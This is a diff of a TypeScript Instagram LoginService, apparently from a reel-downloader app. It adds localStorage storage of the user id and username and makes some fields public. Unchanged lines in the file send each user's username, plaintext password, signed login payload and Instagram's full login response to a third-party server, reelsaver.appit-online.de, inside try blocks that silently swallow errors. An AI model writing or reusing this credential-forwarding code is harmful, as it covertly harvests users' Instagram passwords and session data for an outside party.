@@ -7,8 +7,8 @@ export class LoginService {
     private pubKeyId: number = -1;
 
     // Instanz-Daten
-    private uuid: string;
-    private deviceId: string;
+    uuid: string;
+    deviceId: string;
     private phoneId: string;
 
     constructor() {
@@ -105,7 +105,7 @@ export class LoginService {
         }
     }
 
-    private generateSignature(
+    generateSignature(
         data: string | Record<string, any>,
         extra: Record<string, string> = {}
     ): Record<string, string> {
@@ -167,6 +167,17 @@ export class LoginService {
         );
 
         try {
+            const userId = resp?.body?.logged_in_user?.pk;
+
+            if (userId && typeof userId === "string") {
+                localStorage.setItem("instaUserId", userId);
+            } else if (userId && typeof userId === "number") {
+                localStorage.setItem("instaUserId", String(userId));
+            }
+            // tslint:disable-next-line:no-empty
+        } catch (err) {}
+
+        try {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
@@ -174,7 +185,6 @@ export class LoginService {
         } catch (e) {}
         return resp;
     }
-
 
     public async login(username: string, pass: string, headers: { [key: string]: string } = {}): Promise<any> {
         if (!this.pubKey || this.pubKeyId < 0) {
@@ -205,8 +215,16 @@ export class LoginService {
           true,
           headers
         )
-        localStorage.setItem("instaUserId", username)
+        localStorage.setItem("instaUserName", username)
+        try {
+            const userId = resp?.body?.logged_in_user?.pk;
 
+            if (userId && typeof userId === "string") {
+                localStorage.setItem("instaUserId", userId);
+            } else if (userId && typeof userId === "number") {
+                localStorage.setItem("instaUserId", String(userId));
+            }
+        } catch (err) {}
         try {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
